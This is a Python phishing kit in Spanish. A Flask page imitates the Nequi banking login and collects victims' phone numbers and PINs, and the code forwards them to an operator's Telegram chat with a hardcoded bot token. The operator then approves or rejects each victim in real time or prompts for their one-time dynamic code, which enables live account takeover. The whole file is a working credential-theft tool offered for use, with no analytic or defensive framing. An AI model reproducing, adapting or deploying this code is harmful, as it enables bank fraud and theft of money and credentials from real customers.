# ========================================
# SERVIDOR WEB + BOT DE TELEGRAM
# ========================================

from flask import Flask, render_template_string, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import threading
from datetime import datetime
import secrets
import asyncio
import logging

# Configurar logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ========================================
# CONFIGURACIÓN - CAMBIA ESTOS VALORES
# ========================================
BOT_TOKEN = "'8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc"  # Reemplaza con tu token
ADMIN_CHAT_ID = "8469651553"  # Reemplaza con tu chat ID

# Base de datos temporal en memoria
usuarios_activos = {}
bot_app = None
loop = None

# ========================================
# PÁGINA WEB HTML
# ========================================
HTML_LOGIN = r"""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Iniciar Sesión</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Red Hat Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            color: #8B5CF6;
            font-size: 48px;
            font-weight: 800;
        }
        .form-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            color: #210049;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 16px;
            border: 2px solid #E5E7EB;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #8B5CF6;
            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.1);
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .mensaje {
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
            display: none;
        }
        .error {
            background: #FEE2E2;
            color: #DC2626;
            display: block;
        }
        .loading {
            background: #DBEAFE;
            color: #2563EB;
            display: block;
        }
        .success {
            background: #D1FAE5;
            color: #059669;
            display: block;
        }
        #esperando-codigo {
            display: none;
        }
        .codigo-info {
            text-align: center;
            padding: 24px;
            background: #F3F4F6;
            border-radius: 12px;
            margin-top: 20px;
        }
        .codigo-info h3 {
            color: #8B5CF6;
            margin-bottom: 12px;
        }
        .spinner {
            border: 4px solid #F3F4F6;
            border-top: 4px solid #8B5CF6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Nequi</h1>
            <p style="color: #666; margin-top: 8px;">💜 Plata de una</p>
        </div>

        <div id="mensaje" class="mensaje"></div>

        <div id="login-form">
            <div class="form-group">
                <label>📱 Número de celular</label>
                <input type="tel" id="numero" placeholder="300 123 4567" maxlength="15">
            </div>
            <div class="form-group">
                <label>🔑 Clave (4 dígitos)</label>
                <input type="password" id="clave" placeholder="••••" maxlength="4">
            </div>
            <button class="btn" onclick="enviarLogin()" id="btnLogin">Entrar</button>
        </div>

        <div id="esperando-codigo">
            <div class="codigo-info">
                <h3>⏳ Verificando tu identidad</h3>
                <div class="spinner"></div>
                <p style="color: #666; margin-top: 16px;">
                    Ingresa el código dinámico que te solicitaremos en un momento...
                </p>
            </div>
        </div>
    </div>

    <script>
        let sessionId = '';
        let checkInterval;

        async function enviarLogin() {
            const numero = document.getElementById('numero').value.trim();
            const clave = document.getElementById('clave').value.trim();
            const mensaje = document.getElementById('mensaje');
            const btnLogin = document.getElementById('btnLogin');

            if (!numero || !clave) {
                mensaje.className = 'mensaje error';
                mensaje.textContent = '❌ Por favor completa todos los campos';
                return;
            }

            if (clave.length !== 4 || !/^[0-9]+$/.test(clave)) {
                mensaje.className = 'mensaje error';
                mensaje.textContent = '❌ La clave debe tener 4 dígitos';
                return;
            }

            mensaje.className = 'mensaje loading';
            mensaje.textContent = '⏳ Verificando credenciales...';
            btnLogin.disabled = true;

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({numero, clave})
                });

                const data = await response.json();
                
                if (data.success) {
                    sessionId = data.session_id;
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('esperando-codigo').style.display = 'block';
                    mensaje.className = 'mensaje success';
                    mensaje.textContent = '✅ Credenciales verificadas';
                    
                    checkInterval = setInterval(checkStatus, 2000);
                } else {
                    mensaje.className = 'mensaje error';
                    mensaje.textContent = data.message || '❌ Error al verificar credenciales';
                    btnLogin.disabled = false;
                }
            } catch (error) {
                mensaje.className = 'mensaje error';
                mensaje.textContent = '❌ Error de conexión';
                btnLogin.disabled = false;
            }
        }

        async function checkStatus() {
            try {
                const response = await fetch('/check_status?session=' + sessionId);
                const data = await response.json();
                
                if (data.status === 'aprobado') {
                    clearInterval(checkInterval);
                    document.getElementById('mensaje').className = 'mensaje success';
                    document.getElementById('mensaje').textContent = '✅ ¡Acceso exitoso! Redirigiendo...';
                    setTimeout(() => {
                        window.location.href = '/exito';
                    }, 2000);
                } else if (data.status === 'rechazado') {
                    clearInterval(checkInterval);
                    document.getElementById('mensaje').className = 'mensaje error';
                    document.getElementById('mensaje').textContent = '❌ ' + (data.message || 'Acceso denegado');
                    setTimeout(() => location.reload(), 3000);
                }
            } catch (error) {
                console.error('Error checking status:', error);
            }
        }

        document.getElementById('clave').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                enviarLogin();
            }
        });
    </script>
</body>
</html>
"""

HTML_EXITO = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Exitoso - Nequi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: 'Red Hat Display', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 60px 40px;
            text-align: center;
            max-width: 400px;
        }
        .checkmark {
            font-size: 80px;
            color: #10B981;
            margin-bottom: 20px;
        }
        h1 {
            color: #8B5CF6;
            margin-bottom: 16px;
        }
        p {
            color: #666;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✅</div>
        <h1>¡Acceso Exitoso!</h1>
        <p>Has ingresado correctamente a Nequi</p>
        <p style="margin-top: 20px; color: #8B5CF6; font-weight: 600;">💜 Gracias por usar Nequi</p>
    </div>
</body>
</html>
"""

# ========================================
# RUTAS DE LA PÁGINA WEB
# ========================================
@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    numero = data.get('numero', '').strip()
    clave = data.get('clave', '').strip()
    
    if not numero or not clave:
        return jsonify({'success': False, 'message': 'Datos incompletos'}), 400
    
    session_id = secrets.token_hex(8)
    
    usuarios_activos[session_id] = {
        'numero': numero,
        'clave': clave,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'esperando',
        'codigo_dinamico': None
    }
    
    # Enviar notificación al admin
    if loop and bot_app:
        asyncio.run_coroutine_threadsafe(
            enviar_notificacion_admin(session_id, numero, clave),
            loop
        )
        logging.info(f"✅ Notificación enviada para sesión: {session_id}")
    else:
        logging.error("❌ Bot no está inicializado correctamente")
    
    return jsonify({'success': True, 'session_id': session_id})

@app.route('/check_status')
def check_status():
    session_id = request.args.get('session', '').strip()
    
    if session_id in usuarios_activos:
        user_data = usuarios_activos[session_id]
        return jsonify({
            'status': user_data['status'],
            'message': user_data.get('message', '')
        })
    
    return jsonify({'status': 'error', 'message': 'Sesión no encontrada'}), 404

@app.route('/exito')
def exito():
    return render_template_string(HTML_EXITO)

@app.route('/health')
def health():
    """Endpoint para verificar que el servidor está vivo"""
    bot_status = "activo" if bot_app else "inactivo"
    return jsonify({
        'status': 'ok',
        'bot': bot_status,
        'sesiones_activas': len(usuarios_activos)
    })

# ========================================
# BOT DE TELEGRAM
# ========================================
async def enviar_notificacion_admin(session_id, numero, clave):
    """Envía notificación con botones inline al admin"""
    mensaje = (
        f"🚨 <b>NUEVO LOGIN DETECTADO</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Número: <code>{numero}</code>\n"
        f"🔑 Clave: <code>{clave}</code>\n"
        f"🆔 Sesión: <code>{session_id}</code>\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    # Crear botones inline
    keyboard = [
        [
            InlineKeyboardButton("✅ Aprobar", callback_data=f"aprobar_{session_id}"),
            InlineKeyboardButton("❌ Rechazar", callback_data=f"rechazar_{session_id}")
        ],
        [
            InlineKeyboardButton("🔄 Pedir Código", callback_data=f"pedir_{session_id}")
        ],
        [
            InlineKeyboardButton("📋 Ver Lista", callback_data="lista")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await bot_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=mensaje,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        logging.info(f"✅ Mensaje enviado exitosamente a {ADMIN_CHAT_ID}")
    except Exception as e:
        logging.error(f"❌ Error enviando mensaje: {e}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja los clicks en los botones inline"""
    query = update.callback_query
    await query.answer()
    
    # Verificar que sea el admin
    if str(query.from_user.id) != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ No autorizado")
        return
    
    data = query.data
    
    if data == "lista":
        await cmd_lista_inline(query)
    elif data.startswith("aprobar_"):
        session_id = data.replace("aprobar_", "")
        await aprobar_session(query, session_id)
    elif data.startswith("rechazar_"):
        session_id = data.replace("rechazar_", "")
        await rechazar_session(query, session_id)
    elif data.startswith("pedir_"):
        session_id = data.replace("pedir_", "")
        await pedir_codigo(query, session_id)

async def aprobar_session(query, session_id):
    """Aprueba una sesión"""
    if session_id not in usuarios_activos:
        await query.edit_message_text("❌ Sesión no encontrada")
        return
    
    usuarios_activos[session_id]['status'] = 'aprobado'
    
    await query.edit_message_text(
        f"✅ <b>SESIÓN APROBADA</b>\n\n"
        f"🆔 Sesión: <code>{session_id}</code>\n"
        f"📱 Número: {usuarios_activos[session_id]['numero']}\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"El usuario verá: <i>Acceso exitoso</i>",
        parse_mode='HTML'
    )

async def rechazar_session(query, session_id):
    """Rechaza una sesión"""
    if session_id not in usuarios_activos:
        await query.edit_message_text("❌ Sesión no encontrada")
        return
    
    usuarios_activos[session_id]['status'] = 'rechazado'
    usuarios_activos[session_id]['message'] = 'Credenciales incorrectas'
    
    await query.edit_message_text(
        f"❌ <b>SESIÓN RECHAZADA</b>\n\n"
        f"🆔 Sesión: <code>{session_id}</code>\n"
        f"📱 Número: {usuarios_activos[session_id]['numero']}\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"El usuario verá: <i>Credenciales incorrectas</i>",
        parse_mode='HTML'
    )

async def pedir_codigo(query, session_id):
    """Solicita código dinámico"""
    if session_id not in usuarios_activos:
        await query.edit_message_text("❌ Sesión no encontrada")
        return
    
    usuarios_activos[session_id]['status'] = 'pidiendo_codigo'
    
    await query.edit_message_text(
        f"🔄 <b>CÓDIGO SOLICITADO</b>\n\n"
        f"🆔 Sesión: <code>{session_id}</code>\n"
        f"📱 Número: {usuarios_activos[session_id]['numero']}\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"El usuario verá: <i>Ingresa tu código dinámico</i>\n\n"
        f"Esperando respuesta del usuario...",
        parse_mode='HTML'
    )

async def cmd_lista_inline(query):
    """Muestra lista de sesiones"""
    if not usuarios_activos:
        await query.edit_message_text("📝 No hay sesiones activas")
        return
    
    mensaje = "📝 <b>SESIONES ACTIVAS:</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for session_id, data in list(usuarios_activos.items())[:5]:  # Máximo 5
        mensaje += (
            f"🆔 <code>{session_id}</code>\n"
            f"📱 {data['numero']}\n"
            f"🔑 {data['clave']}\n"
            f"📊 Estado: {data['status']}\n"
            f"⏰ {data['timestamp']}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
        )
    
    keyboard = [[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(mensaje, reply_markup=reply_markup, parse_mode='HTML')

# Comandos tradicionales
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start"""
    await update.message.reply_text(
        "🤖 <b>Bot de Monitoreo Iniciado</b>\n\n"
        "Usa /help para ver los comandos disponibles\n"
        "Las notificaciones llegarán automáticamente con botones interactivos",
        parse_mode='HTML'
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help"""
    mensaje = (
        "🤖 <b>COMANDOS DISPONIBLES:</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "/start - Iniciar bot\n"
        "/help - Ver ayuda\n"
        "/lista - Ver sesiones activas\n"
        "/status - Estado del sistema\n\n"
        "<i>💡 Las notificaciones incluyen botones para control rápido</i>"
    )
    await update.message.reply_text(mensaje, parse_mode='HTML')

async def cmd_lista(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /lista"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ No autorizado")
        return
    
    if not usuarios_activos:
        await update.message.reply_text("📝 No hay sesiones activas")
        return
    
    mensaje = "📝 <b>SESIONES ACTIVAS:</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for session_id, data in usuarios_activos.items():
        mensaje += (
            f"🆔 <code>{session_id}</code>\n"
            f"📱 {data['numero']}\n"
            f"🔑 {data['clave']}\n"
            f"📊 Estado: {data['status']}\n"
            f"⏰ {data['timestamp']}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        
        if len(mensaje) > 3500:
            await update.message.reply_text(mensaje, parse_mode='HTML')
            mensaje = ""
    
    if mensaje:
        await update.message.reply_text(mensaje, parse_mode='HTML')

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /status"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ No autorizado")
        return
    
    mensaje = (
        f"📊 <b>ESTADO DEL SISTEMA</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🤖 Bot: Activo\n"
        f"🌐 Servidor: Activo\n"
        f"📝 Sesiones: {len(usuarios_activos)}\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await update.message.reply_text(mensaje, parse_mode='HTML')

# ========================================
# INICIALIZACIÓN
# ========================================
def run_bot():
    """Ejecuta el bot de Telegram"""
    global bot_app, loop
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    bot_app = Application.builder().token(BOT_TOKEN).build()
    
    # Agregar handlers
    bot_app.add_handler(CommandHandler("start", cmd_start))
    bot_app.add_handler(CommandHandler("help", cmd_help))
    bot_app.add_handler(CommandHandler("lista", cmd_lista))
    bot_app.add_handler(CommandHandler("status", cmd_status))
    bot_app.add_handler(CallbackQueryHandler(button_callback))
    
    logging.info("🤖 Bot de Telegram iniciado")
    logging.info(f"👤 Admin ID: {ADMIN_CHAT_ID}")
    
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    print("=" * 50)
    print("🚀 INICIANDO SISTEMA")
    print("=" * 50)
    
    # Verificar configuración
    if BOT_TOKEN == "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc" or ADMIN_CHAT_ID == "8469651553":
        print("❌ ERROR: Debes configurar BOT_TOKEN y ADMIN_CHAT_ID")
        print("📝 Edita las líneas 30-31 del código")
        exit(1)
    
    # Iniciar bot en thread separado
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    import time
    time.sleep(3)
    
    print("=" * 50)
    print("✅ SERVIDOR WEB INICIADO")
    print("=" * 50)
    print("📱 Local: http://localhost:5000")
    print("🌐 Red: http://0.0.0.0:5000")
    print("🤖 Bot de Telegram activo")
    print("=" * 50)
    
    # Iniciar servidor web
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
